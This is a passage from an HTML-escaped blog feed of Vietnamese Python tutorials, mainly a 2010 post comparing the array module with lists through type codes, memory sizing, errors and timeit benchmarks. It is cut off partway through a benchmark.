        &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Chuẩn viết mã Python là không quá 80 ký tự trên một dòng. Python One-Liner viết hết các lệnh Python trên một dòng, làm cho các line dài hơn bình thường. Mã Python khó đọc và khó hiểu hơn do cách viết cô đọng, các biến được đặt tên ngắn. Với các bài toán không mang tính cơ bản, các bạn nên hạn chế viết theo cách này.&lt;/p&gt;
&lt;p&gt;Các chương trình viết trên một dòng không có nghĩa là nhanh nhất. Thậm chí trong đa số các trường hợp để viết trên một dòng người ta phải chọn cách viết mất nhiều thời gian chạy hơn. Do vậy khi kích thước dữ liệu lớn, tốt hơn hết hãy lựa chọn cách viết tối ưu, và chấp nhận mã dài hơn.&lt;/p&gt;
&lt;p&gt;Tôi hi vọng rằng các bạn sẽ thích thú với các ví dụ trên đây. Chắc chắn còn nhiều cách giải khác cho mỗi vấn đề mà tôi đã nêu ra. Nếu các bạn tìm thấy chúng xin hãy vui lòng comment để mọi người cùng biết. Điều sau cùng tôi muốn nhấn mạnh là &lt;em&gt;tuy việc tìm kiếm các lời giải một dòng cho mỗi vấn đề chỉ đơn giản là thú vui, ít mang tính ứng dụng, nhưng chúng thực sự sẽ thúc đẩy việc học hỏi và tìm kiếm kinh nghiệm của chúng ta.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Một số bài tập Python có thể triển khai trên một dòng:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Tạo ma trận đơn vị kích thước bất kỳ&lt;/li&gt;
&lt;li&gt;Triển khai sàng Sieve of Eratosthenes&lt;/li&gt;
&lt;li&gt;Triển khai dãy số Fibonacci.&lt;/li&gt;
&lt;li&gt;Tạo một list chứa tất cả các hoán vị của một list khác (các phần tử có thể bằng nhau).&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
</content><category term="one-liner"></category><category term="ngôn ngữ"></category><category term="list"></category><category term="collections"></category><category term="operator"></category><category term="mẹo python"></category></entry><entry><title>"Efficient arrays" có nhanh hơn list?</title><link href="/2010/01/efficient-arrays-co-nhanh-hon-list.html" rel="alternate"></link><published>2010-01-16T16:20:00+07:00</published><updated>2010-01-16T16:20:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2010-01-16:/2010/01/efficient-arrays-co-nhanh-hon-list.html</id><summary type="html">&lt;div class="section" id="gioi-thieu-ve-efficient-arrays"&gt;
&lt;h2&gt;1. Giới thiệu về &amp;quot;Efficient arrays&amp;quot;&lt;/h2&gt;
&lt;p&gt;Kiểu dữ liệu list có thể chứa đựng bất kỳ cái gì thuộc bất kỳ cấu trúc nào. Khái niệm về list (hay danh sách) trong Python gần gũi với ý niệm về cái túi (a bag). Một bag có thể chứa bánh kẹo …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="gioi-thieu-ve-efficient-arrays"&gt;
&lt;h2&gt;1. Giới thiệu về &amp;quot;Efficient arrays&amp;quot;&lt;/h2&gt;
&lt;p&gt;Kiểu dữ liệu list có thể chứa đựng bất kỳ cái gì thuộc bất kỳ cấu trúc nào. Khái niệm về list (hay danh sách) trong Python gần gũi với ý niệm về cái túi (a bag). Một bag có thể chứa bánh kẹo, hoa quả, quần áo... Điểm khác biệt là list thì có thứ tự, các phần tử được truy cập qua một index duy nhất.&lt;/p&gt;
&lt;p&gt;Về điểm này list khác với khái niệm về array - hay mảng trong các ngôn ngữ thông thường khác. Chẳng hạn trong VB.NET một array là một danh sách có thứ tự các phần tử có cùng cấu trúc. Bạn luôn luôn phải chỉ rõ kiểu của phần tử trong mỗi array qua khai báo &lt;strong&gt;array of type&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Chính vì list có thể chứa bất kỳ phần tử thuộc bất kỳ cấu trúc nào mà một số thao tác phụ thuộc vào cấu trúc dữ liệu trên mỗi phần tử có thể chậm đi đáng kể. Hay một số thao tác thông thường có sẵn trong các ngôn ngữ khác đã không được triển khai trong Python do kiểu dữ liệu có thể khác nhau giữa các phần tử. Chẳng hạn việc sắp xếp một danh sách sẽ chậm đi do phải xác định chính xác kiểu dữ liệu của mỗi phần tử khi so sánh. Việc đọc một list từ file text hoặc từ một string sẽ không được triển khai bằng các hàm built-in.&lt;/p&gt;
&lt;p&gt;Python hỗ trợ bạn tạo ra các list hiệu quả và chặt chẽ hơn bằng khái niệm &lt;strong&gt;&amp;quot;Efficient arrays&amp;quot;&lt;/strong&gt; có trong thư viện array. Tuy nhiên module này chỉ hỗ trợ kiểu dữ liệu số và ký tự. Bạn không thể dùng các &amp;quot;Efficient arrays&amp;quot; cho các string hay boolean.&lt;/p&gt;
&lt;p&gt;Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;array&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;array(&amp;#39;I&amp;#39;, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;u&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;array(&amp;#39;u&amp;#39;, &amp;#39;hello&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ 1 khai báo một &lt;strong&gt;mảng&lt;/strong&gt; (hay array) các số nguyên &lt;strong&gt;unsiged int&lt;/strong&gt; chứa các giá trị từ 0 đến 9. 'I' gọi là &lt;strong&gt;type code&lt;/strong&gt; - một giá trị quy định kiểu của mỗi item trong mảng. Đoạn mã phía sau đó khai báo một array của các ký tự unicode. Dưới đây là danh sách các &lt;strong&gt;type code&lt;/strong&gt; được hỗ trợ trong Python 3.1:&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="15%" /&gt;
&lt;col width="23%" /&gt;
&lt;col width="28%" /&gt;
&lt;col width="34%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;Type code&lt;/th&gt;
&lt;th class="head"&gt;C Type&lt;/th&gt;
&lt;th class="head"&gt;Python Type&lt;/th&gt;
&lt;th class="head"&gt;Minimum size in bytes&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;b&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;signed char&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;B&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;unsigned char&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;u&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Py_UNICODE&lt;/td&gt;
&lt;td&gt;Unicode character&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;h&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;signed short&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;H&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;unsigned short&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;i&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;signed int&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;I&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;unsigned int&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;l&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;signed long&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;L&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;unsigned long&lt;/td&gt;
&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;f&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;float&lt;/td&gt;
&lt;td&gt;float&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;d&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;double&lt;/td&gt;
&lt;td&gt;float&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Như trong tài liệu Python viết. Kích thước thực sự của một số type code như 'i', 'I', 'l', 'L' phụ thuộc vào kiến trúc máy tính triển khai python (thông thường là sự khác biệt giữa kiến trúc 32 bit và 64 bit - xem thêm: &lt;a class="reference external" href="http://en.wikipedia.org/wiki/Integer_%28computer_science%29"&gt;Integer - computer science&lt;/a&gt;). Kiểu của mỗi phần tử trong mảng chính xác là kiểu của ngôn ngữ C tương ứng trong bảng, vì vậy kích thước của mảng luôn có thể xác định chính xác. Điều này khác với list. Khi nhận được một list rất khó để xác định chính xác kích thước bộ nhớ của nó. Module array có các hàm &lt;strong&gt;buffer_info()&lt;/strong&gt; và &lt;strong&gt;itemsize&lt;/strong&gt; cho phép thực hiện điều này. Hàm buffer_info() cho kết quả một tuple chứa địa chỉ bộ nhớ và số phần tử của mảng. Hàm itemsize cho biết kích thước của mỗi phần tử theo byte. Để tính kích thước bộ nhớ mà python cấp phát cho mảng dùng biểu thức: &lt;strong&gt;x.buffer_info()[1] * x.itemsize&lt;/strong&gt;. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;u&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;itemsize&lt;/span&gt;
&lt;span class="go"&gt;2&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;buffer_info&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;(29756264, 6)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;buffer_info&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;itemsize&lt;/span&gt;
&lt;span class="go"&gt;12&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Các mảng quy định rõ kiểu giá trị nó chứa, vì vậy không thể lưu các giá trị vượt phạm vi cho phép hoặc các giá trị không đúng kiểu. Python báo lỗi khi xảy ra sự kiện này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;L&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;interactive input&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="gr"&gt;OverflowError&lt;/span&gt;: &lt;span class="n"&gt;python int too large to convert to C unsigned long&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
&lt;span class="go"&gt;array(&amp;#39;I&amp;#39;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;interactive input&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="gr"&gt;TypeError&lt;/span&gt;: &lt;span class="n"&gt;an integer is required&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong python 3.* type code 'c' không còn được sử dụng do từ Python 3.0 trở đi kiểu dữ liệu string luôn luôn là unicode.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;interactive input&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="gr"&gt;ValueError&lt;/span&gt;: &lt;span class="n"&gt;bad typecode (must be b, B, u, h, H, i, I, l, L, f or d)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Type code 'u' cũng sẽ khác nhau về kích thước trên các hệ điều hành khác nhau, khi chúng triển khai UCS2 (2 byte) hoặc UCS4 (4 byte). Để biết máy bạn dùng UCS mấy gõ lệnh sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;maxunicode&lt;/span&gt;
&lt;span class="go"&gt;65535&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Đó là UCS2, trên hệ thống mà Python được compile với UCS4 kết quả phải lớn hơn.&lt;/p&gt;
&lt;p&gt;Module &lt;tt class="docutils literal"&gt;array&lt;/tt&gt; có hầu hết các phương thức tương tự &lt;tt class="docutils literal"&gt;list&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]))&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;__add__&amp;#39;, &amp;#39;__class__&amp;#39;, &amp;#39;__contains__&amp;#39;, &amp;#39;__copy__&amp;#39;, &amp;#39;__deepcopy__&amp;#39;, &amp;#39;__delattr__&amp;#39;, &amp;#39;__delitem__&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;__doc__&amp;#39;, &amp;#39;__eq__&amp;#39;, &amp;#39;__format__&amp;#39;, &amp;#39;__ge__&amp;#39;, &amp;#39;__getattribute__&amp;#39;, &amp;#39;__getitem__&amp;#39;, &amp;#39;__gt__&amp;#39;, &amp;#39;__hash__&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;__iadd__&amp;#39;, &amp;#39;__imul__&amp;#39;, &amp;#39;__init__&amp;#39;, &amp;#39;__iter__&amp;#39;, &amp;#39;__le__&amp;#39;, &amp;#39;__len__&amp;#39;, &amp;#39;__lt__&amp;#39;, &amp;#39;__mul__&amp;#39;, &amp;#39;__ne__&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;__new__&amp;#39;, &amp;#39;__reduce__&amp;#39;, &amp;#39;__reduce_ex__&amp;#39;, &amp;#39;__repr__&amp;#39;, &amp;#39;__rmul__&amp;#39;, &amp;#39;__setattr__&amp;#39;, &amp;#39;__setitem__&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;__sizeof__&amp;#39;, &amp;#39;__str__&amp;#39;, &amp;#39;__subclasshook__&amp;#39;, &amp;#39;append&amp;#39;, &amp;#39;buffer_info&amp;#39;, &amp;#39;byteswap&amp;#39;, &amp;#39;count&amp;#39;, &amp;#39;extend&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;fromfile&amp;#39;, &amp;#39;fromlist&amp;#39;, &amp;#39;fromstring&amp;#39;, &amp;#39;fromunicode&amp;#39;, &amp;#39;index&amp;#39;, &amp;#39;insert&amp;#39;, &amp;#39;itemsize&amp;#39;, &amp;#39;pop&amp;#39;, &amp;#39;remove&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;reverse&amp;#39;, &amp;#39;tofile&amp;#39;, &amp;#39;tolist&amp;#39;, &amp;#39;tostring&amp;#39;, &amp;#39;tounicode&amp;#39;, &amp;#39;typecode&amp;#39;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong danh sách trên ta thấy &lt;tt class="docutils literal"&gt;array&lt;/tt&gt; &lt;em&gt;không có&lt;/em&gt; phương thức &lt;strong&gt;sort&lt;/strong&gt; giống như &lt;tt class="docutils literal"&gt;list&lt;/tt&gt;. Để sắp xếp các array, bạn có thể dùng hàm &lt;strong&gt;sorted&lt;/strong&gt;. Hàm &lt;strong&gt;sorted&lt;/strong&gt; là hàm built-in, khác với &lt;strong&gt;list.sort&lt;/strong&gt; nó tạo ra list mới và không thay đổi list gốc.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;array&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[2.302585092994046, 2.718281828459045, 3.141592653589793]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[3.141592653589793, 2.718281828459045, 2.302585092994046]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="efficient-arrays-nhanh-hon-list-nhu-nao"&gt;
&lt;h2&gt;2. &amp;quot;Efficient arrays&amp;quot; nhanh hơn list như nào?&lt;/h2&gt;
&lt;p&gt;Trong phần này chúng ta sẽ thực hiện một số kiểm tra performance giữa array và list trên một số thao tác điển hình. Chỉ một số thao tác được kiểm tra, kết quả thời gian có thể khác nhau với các phiên bản Python, hay các cấu hình máy khác. Tuy nhiên tôi cố gắng đặt các kiểm tra trong cùng một tập các điều kiện thí nghiệm, và chỉ xem xét tương quan giữa các con số nhằm rút ra một kết luận nào đó.&lt;/p&gt;
&lt;p&gt;Đầu tiên là sắp xếp - thao tác cơ bản đặc trưng cho một list.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;timeit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Timer&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a.sort()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=list(range(10**4)); &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.05681145858943637&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=list(range(10**4)); &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.7554756694498792&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random,array;a=array.array(&amp;#39;L&amp;#39;, range(10**4));&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
